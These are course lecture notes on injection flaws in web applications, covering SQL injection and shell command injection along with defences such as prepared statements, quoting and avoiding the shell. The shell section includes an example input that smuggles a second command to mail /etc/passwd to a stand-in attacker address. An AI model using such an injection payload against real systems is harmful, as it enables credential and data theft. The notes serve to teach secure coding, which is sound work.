---
layout: post
title: Les 2 - Passing data to subsystems
lesson: 2
---

SQL Injections en Shell injections.

## Downloads

[Powerpoint](https://drive.google.com/file/d/18gcORMbJGv5ODNqmnEF53Q2TkxOnAe8s/view?usp=sharing){:target="_blank"}  
[Lab 2](https://drive.google.com/file/d/1oUaWcYxbQvIKiDnrbtBBXVc0B3Jvzy2n/view?usp=sharing){:target="_blank"}

## Lesvideo
<iframe src="https://drive.google.com/file/d/1hmas99KjPcFx4q4rYP6pM968HNHYYEoV/preview" width="640" height="360" allowFullScreen allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>


## Aantekeningen
Most dynamic web applications pass data to one or more **subsystems**:
* SQL databases
* Operating systems
* Libraries
* Shell command interpreters
* XPath handlers
* XML documents
* Legacy systems
* Users’ browsers

We communicate with these subsystems by building **strings** that contain some **control information**, and some **data**.

To our application, the data parts of what we send are just strings; sequences of characters.
The characters strings may represent names, addresses, passwords, entire web pages, and just about everything.

**Metacharacters**  
When our application passes data around, the strings may reach a system in which one or more of the characters are **not treated as plain text**, but as **something special**.
When passing the border between our application and that subsystem, the character changes from being an information-carrying piece of a text to becoming a **control character**.

It has become a **metacharacter**, as it rises above the pure data.

Metacharacters are needed for many things, and they do not pose a threat by themselves.
The problems is raised when developers think they are passing pure data, and those "data" are found to contain characters that **make the subsystem do something else than we expect**.

An attacker may be able to **control** what the subsystem does, by **passing control information to the subsystem**.

### SQL Injection
In SQL Injection, an attacker is able to **modify** or **add** queries that are sent to a database by **playing** with input to the web application.
The attack works when a program builds queries based on strings from the client, and passes them to the database server **without** handling characters that have special meaning to the server.

**The issue:**  
Suppose we would like to make a web application that requires users to log-in
through a form:
![sql issue](\assets\images\ana_software_quality\lesson2\sql-issue.jpg)
How does a hacker attack it? ![sql attack](\assets\images\ana_software_quality\lesson2\sql-attack.jpg)

As our program just inserts the input unmodified in the query, what eventually is sent to the database looks like this:
![sql injection](\assets\images\ana_software_quality\lesson2\sql-injection-query.jpg)

The **two hyphens (- -)** make up an SQL comment introducer.
It effectively **inactivates** the test for a matching password!

Does it solve the issue if we filter out that double hyphen?
No. The hyphens are not part of the problem at all.

**The real problem**: The attacker is allowed to make the SQL parser **switch context**.

The solution involves **metacharacters**.

We should make them **lose** their **special meaning**, Either by handling them **manually**,
or preferably by building queries in a way in which there are **no metacharacters**.

1. **Neutralizing** SQL metacharacters
2. Using **prepared** statements

Character replacement solution in PHP:
![PHP example](\assets\images\ana_software_quality\lesson2\sql-neutralize-metacharacters.jpg)

**Prepared statements**  
Instead of handling the escaping of SQL metacharacters ourselves, we could use prepared statements.
In this method, query parameters are passed **separately** from the SQL statement itself.
When using prepared statements, there are **no metacharacters**.

Java example:
![Java prepared statement](\assets\images\ana_software_quality\lesson2\sql-prepared-statement.jpg)

Benefits:
1. We **don’t need to remember** all that metacharacter handling.
2. Prepared statements generally **execute faster** than plain statements, as they get parsed only once by the database server.

### Shell Command Injection
Programs written in web programming languages, such as Perl and similar languages often rely heavily on running **external commands** to perform many tasks.
When a Perl program runs an external command, the interpreter will in many cases **leave** the actual running of the program to an **operating system** shell, such as sh, bash, csh or tcsh.

Unfortunately, **shells** typically understand a large set of **metacharacters**, and one risks major security problems **if one doesn’t do any filtering**.


**Example:**  
In Unix, there has traditionally been a file called `/etc/passwd` that contains **information of all users**, including hashed representations of their **passwords**.

Imagine a Perl-based CGI script that for some reason sends someone an E-mail.
The E-mail is sent by piping the contents of the mail through the sendmail program. It needs the recipient address on the command line.
![email piping command](\assets\images\ana_software_quality\lesson2\email-piping-command.jpg)

The password-stealing intruder registers with the following "E-mail address":
```
foo@bar.example; mail badguy@badguy.example < /etc/passwd
```

When included in the sendmail invocation in the open statement above, the
commands executed by the shell will be:
```
/user/sbin/sendmail foo@bar.example;
mail badguy@badguy.example < /etc/passwd
```

Result?
1. First that call to sendmail.
2. Then a semicolon which again functions as a command separator
3. Finally a call to another common Unix mailer, mail, that actually **passes the entire `/etc/passwd` to the attacker**.

**Avoiding shell command injection**  
1. Identify when the shell is being used.
2. Handling and Disarming the shell metacharacters.
3. Avoiding user input in the command arguments.
4. Managing without the shell.

**1. Invocation of the shell**  
Identify **the functions** in your programming language that pass data to a command shell, or the ways to **invoke** a shell.

**2. Handling the shell metacharacters**  
Different shells have different metacharacters, and the use of the metacharacters differs too.

Metacharacters in Bash (GNU Bourne-Again SHell):
![bash metacharacters](\assets\images\ana_software_quality\lesson2\bash-metacharacters.jpg)

Solution 1: single quote encapsulation  
The **single quote encapsulation** is the strictest way to make the shell treat a text as just plain text.
* The single quotes are thus good for encapsulating data that do not contain single quotes.
* If data contain single quotes, we can still use single quote encapsulation if we **split** the string on all single quotes and glue quoted strings together using a **backslash-escaped single quote**.
![single quote encapsulation function](\assets\images\ana_software_quality\lesson2\single-quote-encapsulation.jpg)

Solution 2: Double quote encapsulation  
Another approach is to encapsulate the data string in **double quotes**.
* Inside a doubly quoted string, all characters except the following characters lose their special meaning: `` $ ` " \ ``
* Occurrences of these four special characters must be escaped using a **backslash**.

Solution 3: escape every metacharacter  
A third approach is to **escape every metacharacter** in the data string by **prefixing them with a backslash**.

It involves what is known as **blacklisting**.
We handle the characters we know are **unsafe**, and let the rest pass unchanged.
There are many metacharacters, and we may easily **miss** some of them.

Escaping shell metacharacters is hard, particularly **if we are not quite sure** what kind of shell will be used.

**3. Avoiding user input in the command arguments**  
If we can **avoid passing user data** on the command line, it becomes simpler.
In such cases neither the shell nor the target program may be tricked into doing nasty stuff by **command line arguments**.

**4. No Shell**  
In many cases we use the shell **just to launch an external program**.
If we do not need any of the **features** provided by the shell, we might just as well start the program directly.

Often, **we do not even need to run an external program** in order to do the job.
For example: for sending E-mails.
A person familiar with SMTP (Simple Mail Transfer Protocol) and network programming would be able to write Perl code to do the same in less than 100 lines.
